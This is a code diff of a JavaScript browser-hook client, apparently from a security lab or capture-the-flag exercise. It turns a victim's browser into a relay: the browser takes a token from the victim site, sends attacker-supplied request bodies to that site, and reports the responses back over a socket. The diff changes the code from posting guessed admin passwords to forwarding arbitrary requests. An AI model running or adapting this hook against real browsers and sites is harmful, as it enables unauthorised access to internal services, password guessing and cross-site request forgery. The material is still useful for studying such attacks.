@@ -1,8 +1,8 @@
 const serverURL = window.location.hostname + ":" + window.location.port;
 
 let token = '';
-let victimURL = 'http://blind_hacker/';
-// let victimURL = 'http://localhost:3001/';
+// let victimURL = 'http://blind_hacker/';
+let victimURL = 'http://localhost:3001/';
 
 window.onload = function () {
 
@@ -10,20 +10,24 @@ window.onload = function () {
     // register hooked browser connection
     socket.emit('browser-connect');
 
-    socket.on('mensaje', function (passwd) {
+    socket.on('mensaje', function (text_id) {
 
         // let passwd = data.split('&')[1].split('=')[1]
 
         // Build formData object.
-        let formData = new FormData();
-        formData.append('username', "admin");
-        formData.append('password', passwd);
+        // let formData = new FormData();
+        // formData.append('username', "admin");
+        // formData.append('password', text_id.text);
+
+        console.log("text:" + text_id.text);
+        console.log("content-type:" + text_id.contentType);
 
         fetch(victimURL + '?indextoken=' + token, {
             method: 'POST',
-            body: formData
+            body: text_id.text,
+            headers: { 'content-type': text_id.contentType }
         }).then(res => res.text()).then(data => {
-            socket.emit('answer', {data: data, passwd: passwd});
+            socket.emit('answer', {data: data, id: text_id.id});
             // console.log("Answer from ikasten:" + data);
         })
         // console.log("recibido:" + JSON.stringify(passwd));
@@ -32,6 +36,7 @@ window.onload = function () {
 
     fetch(victimURL + "token.php").then(res => res.text()).then(data => {
         token = data.split(" ")[4];
+        console.log(token);
     })
 
 };
